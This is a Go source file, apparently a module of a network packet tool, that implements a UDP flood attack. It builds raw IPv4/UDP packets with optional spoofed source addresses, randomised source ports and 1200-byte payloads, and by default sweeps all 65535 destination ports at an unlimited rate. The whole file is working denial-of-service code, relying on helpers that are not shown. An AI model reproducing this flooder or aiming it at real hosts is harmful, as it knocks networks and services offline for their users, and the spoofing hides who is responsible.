package module

import (
	"os"
	"log"
	_"net"
	_"time"
	"strings"
	_"strconv"
	"math/rand"
	_"encoding/binary"

	"cjr/protocol"
	flags "github.com/jessevdk/go-flags"
)

type UDPFloodOpt struct {
	BaseOption
	Spoof string `short:"s" long:"spoof" description:"use spoof address" value-name:"address[/mask]" default:""`
	DestFunc func(string) `short:"d" long:"destination" description:"destination address" value-name:"address"`
	PortFunc func(string) `short:"p" long:"dport" description:"destination port" value-name:"port[:port]"`
	ports []uint16
	CountFunc func(int) `short:"c" long:"count" description:"stop after sending count packets" value-name:"count" default:"0"`
	RateFunc func(string) `short:"r" long:"rate" description:"send packets as a specific rate, such as 100/ms, 2/s, 100/min, the default is \"nolimit\"" value-name:"<speed>" default:"nolimit"`
	TTL uint `short:"t" long:"ttl" description:"set TTL of IP packet" value-name:"ttl" default:"64"`
}

func (u *UDPFloodOpt) IsBroadcast() bool {
	return false
}

func udpFloodEntry(remainFlags []string) {
	var opts UDPFloodOpt

	opts.PortFunc = func(portStr string) {
		var st, en uint16
		sepCount := strings.Count(portStr, ":")
		if sepCount == 1 {
			ports := strings.Split(portStr, ":")
			st = parsePortOrDie(ports[0])
			en = parsePortOrDie(ports[1])
			if st > en {
				log.Fatal("start port number must be smaller than end port number")
			}
		} else if sepCount == 0 {
			st = parsePortOrDie(portStr)
			en = st
		} else {
			log.Fatal("wrong port format")
		}
		for i := st; i <= en; i++ {
			opts.ports = append(opts.ports, i)
		}
		// sort unique
		m := make(map[uint16] int)
		for _, i := range opts.ports {
			m[i] = 1
		}
		opts.ports = opts.ports[:0]
		for i, _ := range m {
			opts.ports = append(opts.ports, i)
		}
	}

	opts.RateFunc = func(rate string) {
		commonRateFunc(&opts, rate)
	}
	opts.DestFunc = func(dest string) {
		commonDestFunc(&opts, dest)
	}
	opts.CountFunc = func(count int) {
		commonCountFunc(&opts, count)
	}

	//fmt.Println(remainFlags)
	cmd := flags.NewParser(&opts, flags.HelpFlag | flags.PrintErrors)

	_, err := cmd.ParseArgs(remainFlags)
	if err != nil {
		log.Fatal(err)
	}

	if len(remainFlags) == 0 {
		cmd.WriteHelp(os.Stderr)
	}
	for _, flag := range remainFlags {
		if flag == "help" {
			cmd.WriteHelp(os.Stderr)
			return
		}
	}

	if len(opts.ports) == 0 {
		opts.ports = make([]uint16, 65535, 65535)
		for i := 1; i < 65536; i++ {
			opts.ports[i - 1] = uint16(i)
		}
	}
	if opts.dest == nil {
		log.Fatal("no destination IP specified")
	}

	udpFloodStart(&opts)
}

func udpFloodStart(opts *UDPFloodOpt) {
	packetSend(udpFloodBuild, opts)
}

var curPort int = 0

func udpFloodBuild(opts_ CommonOption) []protocol.Layer {
	opts := opts_.(*UDPFloodOpt)
	srcip := chooseIPv4(opts.Spoof)
	// TODO fill some content
	unknownAppData := &protocol.UnknownApplicationLayer {
		Data: make([]byte, 1200, 1200),
	}

	pseudoHeader := make([]byte, 12, 12)
	copy(pseudoHeader[0:4], srcip.To4())
	copy(pseudoHeader[4:8], opts.dest.To4())
	udp := &protocol.UDP {
		PseudoHeader: pseudoHeader,
		SrcPort: uint16(rand.Intn(65535) + 1),
		DstPort: opts.ports[curPort],
	}
	curPort++
	if curPort >= len(opts.ports) {
		curPort -= len(opts.ports)
	}

	ip4 := &protocol.IPv4Packet {
		Version: 4,
		IHL: 5,
		DSCP: 0,
		ECN: 0, // TODO just see what will happen
		ID: uint16(rand.Intn(0xffff)),
		DF: true,
		MF: false,
		FragmentOffset: 0,
		TTL: uint8(opts.TTL),
		Protocol: protocol.IPP_UDP,
		SrcIP: srcip,
		DstIP: opts.dest,
	}
	return []protocol.Layer{ip4, udp, unknownAppData}
}
